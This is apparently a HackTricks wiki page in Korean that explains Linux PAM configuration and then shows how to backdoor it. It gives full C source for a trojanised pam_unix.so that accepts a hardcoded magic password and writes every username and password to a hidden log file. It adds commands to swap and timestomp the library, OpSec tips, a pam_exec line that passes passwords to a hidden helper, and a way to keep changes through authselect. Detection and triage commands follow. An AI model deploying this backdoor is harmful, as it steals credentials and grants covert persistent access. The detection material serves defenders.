# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 기본 정보

**PAM (Pluggable Authentication Modules)**은 **컴퓨터 서비스에 접근하려는 사용자의 신원을 확인**하고, 다양한 기준에 따라 접근을 제어하는 보안 메커니즘입니다. 이는 디지털 문지기와 같아서 인증된 사용자만 특정 서비스에 접근할 수 있도록 하며, 시스템 과부하를 방지하기 위해 사용량을 제한할 수도 있습니다.

#### 설정 파일

- **Solaris**는 기존 중앙 파일인 `/etc/pam.conf`를 지원하지만, 현재 지침에서는 `/etc/pam.d` 아래의 service file을 사용할 것을 권장합니다.<sup>[[10]](#references)</sup>
- **Linux systems**는 directory 방식을 선호하며, service별 설정을 `/etc/pam.d` 내에 저장합니다. 예를 들어 login service의 설정 파일은 `/etc/pam.d/login`에 있습니다.<sup>[[1]](#references)</sup>

login service의 PAM 설정 예시는 다음과 같습니다:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

이러한 realm 또는 management group에는 **auth**, **account**, **password**, **session**이 포함되며, 각각 authentication 및 session management process의 서로 다른 측면을 담당합니다:<sup>[[1]](#references)</sup>

- **Auth**: 일반적으로 password를 입력하도록 요청하여 사용자의 identity를 검증합니다.
- **Account**: group membership 또는 time-of-day restrictions와 같은 조건을 확인하여 account verification을 처리합니다.
- **Password**: complexity checks 또는 dictionary attacks prevention을 포함한 password updates를 관리합니다.
- **Session**: directory mounting 또는 resource limits 설정과 같이 service session 시작 또는 종료 시 수행되는 작업을 관리합니다.

#### **PAM Module Controls**

Controls는 success 또는 failure에 대한 module의 response를 지정하며, 전체 authentication process에 영향을 줍니다. 여기에는 다음이 포함됩니다:<sup>[[1]](#references)</sup>

- **Required**: required module이 failure하면 최종적으로 failure가 발생하지만, 이후의 모든 module을 확인한 후에만 처리됩니다.
- **Requisite**: failure가 발생하면 process가 즉시 종료됩니다.
- **Sufficient**: 이전 `required` module이 failure하지 않았다면 success가 즉시 반환되고 동일한 management group의 나머지 module은 건너뜁니다.
- **Optional**: stack에 해당 module만 있는 경우에만 failure를 발생시킵니다.

#### Offensive Semantics That Matter

PAM을 분석하거나 수정할 때는 **삽입된 rule의 위치**에 따라 해당 rule을 확인하는 stack이 결정됩니다:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` 및 `substack`은 다른 file에서 rule을 가져오므로, `sshd`를 수정하면 SSH에만 영향을 줄 수 있는 반면 `system-auth`, `common-auth` 또는 다른 shared stack을 수정하면 여러 service에 동시에 영향을 줍니다.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM은 `[success=1 default=ignore]`와 같은 bracketed controls도 지원합니다. 이를 악용하면 눈에 띄게 `pam_unix.so`를 교체하는 대신, custom check가 성공한 후 하나 이상의 module을 **건너뛸 수 있습니다**.<sup>[[1]](#references)</sup>
- `module-path`는 **absolute** (`/usr/lib/security/pam_custom.so`)이거나 기본 PAM module directory에 대한 **relative** 경로일 수 있습니다. 최신 Linux system에서 실제 directory는 대개 `/lib/security`, `/lib64/security`, `/usr/lib/security` 또는 `/usr/lib/x86_64-linux-gnu/security`와 같은 multiarch 경로입니다.<sup>[[1]](#references)[[14]](#references)</sup>

간단한 operator takeaway: patching하기 전에 항상 **전체 service graph**를 매핑해야 합니다. 예를 들어 일부 distro에서는 `sshd -> password-auth -> system-auth`, 다른 distro에서는 `sshd -> system-remote-login -> system-login -> system-auth`가 사용되므로, 동일한 one-line implant가 의도보다 훨씬 더 넓은 범위로 확산될 수 있습니다.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

여러 auth module이 있는 setup에서는 process가 엄격한 순서에 따라 진행됩니다. `pam_securetty` module이 login terminal을 unauthorized로 판단하면 root login이 차단되지만, 해당 module의 "required" status로 인해 모든 module은 계속 처리됩니다. `pam_env`는 environment variables를 설정하여 user experience 개선에 도움을 줄 수 있습니다. `pam_ldap` 및 `pam_unix` module은 함께 작동하여 사용자를 authenticate하며, `pam_unix`는 이전에 제공된 password를 사용하려고 시도하여 authentication method의 효율성과 유연성을 높입니다.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

high-value Linux environment에서 사용하는 classic persistence trick은 **정상적인 PAM library를 trojanised drop-in으로 교체하는 것**입니다. PAM stack이 `pam_unix.so`를 로드하는 host에서는 SSH 또는 console authentication이 해당 library의 `pam_sm_authenticate()` entry point를 호출할 수 있으며, malicious replacement는 credentials를 capture하거나 *magic* password bypass를 구현할 수 있습니다.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
아래 sketch는 Linux-PAM의 `pam_sm_authenticate()` service entry point와 `pam_get_authtok()`를 사용하여 authentication token에 access합니다.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

컴파일한 후 stealth-replace합니다(교체/timestomp 패턴은 Unit 42에서 문서화되어 있습니다). wrapper에 하드코딩된 backup 경로와 아래 명령을 대상의 실제 PAM module 디렉터리에 맞게 조정합니다:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec 팁
1. **Atomic overwrite** – 완전한 library를 임시 파일에 작성한 다음 해당 파일을 제 위치로 rename하여 부분적으로 작성된 authentication module이 남지 않도록 합니다.
2. Unit 42의 AuthDoor 분석에서 `/usr/bin/.dbus.log`와 같은 path가 관찰되었으므로, 이는 유용한 hunting indicator이기도 합니다.<sup>[[2]](#references)</sup>
3. PAM stack에서 예상하는 entry point(예: `pam_sm_authenticate` 및 `pam_sm_setcred`)를 유지하여 다른 management operation이 계속 작동하도록 합니다.<sup>[[11]](#references)[[18]](#references)</sup>

### 탐지
package-integrity check의 경우 RPM은 설치된 file metadata를 검증하고, `debsums -s`는 checksum error를 보고하며, triage block의 `dpkg -S`는 package ownership을 조회합니다. audit watch syntax는 path에 대한 write와 attribute change를 기록합니다.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so`의 MD5/SHA256을 distro package와 비교합니다.
* 수동 hashing 없이 교체된 library를 탐지하려면 `rpm -V pam` 또는 `debsums -s libpam-modules`를 사용합니다.
* `/lib/security/` 아래에서 world-writable이거나 비정상적인 ownership을 확인합니다.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* 예상하지 못한 module이 있는지 PAM config를 Grep합니다: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### 빠른 triage 명령(침해 이후 또는 threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### persistence를 위한 `pam_exec` 악용
`pam_unix.so`를 교체하는 대신, `/etc/pam.d/sshd`에 `pam_exec` 줄을 추가하는 더 가벼운 방법을 사용할 수 있습니다. 그러면 해당 PAM 줄에 도달하는 invocation이 일반적인 stack은 그대로 유지하면서 helper를 실행합니다.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`는 `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, `PAM_TYPE`와 같은 환경 변수로 PAM 메타데이터를 받습니다. `expose_authtok`를 사용하면 `auth` 또는 `password` phase 중 helper가 `stdin`에서 최대 `PAM_MAX_RESP_SIZE` 바이트의 password를 읽을 수 있습니다. helper를 real UID 대신 effective UID로 실행하려면 `seteuid`를 추가합니다.<sup>[[4]](#references)</sup>

실무 참고 사항은 `pam_exec`에 문서화된 module types와 `type=` filter를 따릅니다.<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...`는 소켓을 다시 열거나 detached daemon을 spawn하는 것과 같은 **post-login actions**에 더 적합합니다.
- `auth optional pam_exec.so quiet expose_authtok ...`는 session이 열리기 전에 실행되므로 일반적으로 **credential capture**에 사용됩니다.
- `type=session` 또는 `type=auth`를 사용하면 특정 PAM phase로 실행을 제한하여 불필요한 이중 실행을 방지할 수 있습니다.

### 배포판 tooling에서 유지하기: `authselect`

`authselect`를 사용하는 RHEL 및 Fedora 계열 시스템에서는 `/etc/pam.d/system-auth` 또는 `/etc/pam.d/password-auth`와 같은 생성된 파일을 직접 수정해도 **`authselect`에 의해 덮어쓰일 수 있습니다**. 지속성을 유지하려면 일반적으로 `/etc/authselect/custom/<profile>/` 아래의 활성 custom profile을 수정한 다음 다시 선택합니다.<sup>[[5]](#references)[[19]](#references)</sup>

root 권한이 있을 때의 일반적인 workflow:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
이는 공격과 triage 모두에 중요합니다. `/etc/pam.d/system-auth`에 `Generated by authselect` 및 `Do not modify this file manually` 배너가 포함되어 있다면, 실제 persistence 지점은 `/etc/pam.d/`가 아니라 `/etc/authselect/custom/` 아래에 있을 수 있습니다.<sup>[[5]](#references)</sup>

### 현장에서 관찰된 최근 tradecraft

2025년에 발표된 **Plague** Linux backdoor 관련 보고서는 동일한 핵심 아이디어를 한 단계 더 발전시킨 사례를 보여주었습니다. 즉, **static bypass password**를 포함하는 악성 PAM component와 로그인 후 session trace를 줄이기 위해 SSH 관련 environment variables 및 shell history (`HISTFILE=/dev/null`)를 정리하는 기능이 함께 사용되었습니다.<sup>[[3]](#references)</sup> 이는 유용한 hunting pattern입니다. backdoor logic은 PAM에 존재하는 반면, stealth artifacts는 authentication이 성공한 **이후에만** 나타날 수 있기 때문입니다.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [비밀스러운 운영자의 플레이북: 글로벌 통신 네트워크 침투 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: 새롭게 발견된 Linux용 PAM 기반 backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect를 사용한 사용자 authentication 구성 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian 매뉴얼 페이지](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian 매뉴얼 페이지](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4에서 Authentication 관리](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package 파일 목록: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian 매뉴얼 페이지](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM 매뉴얼](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
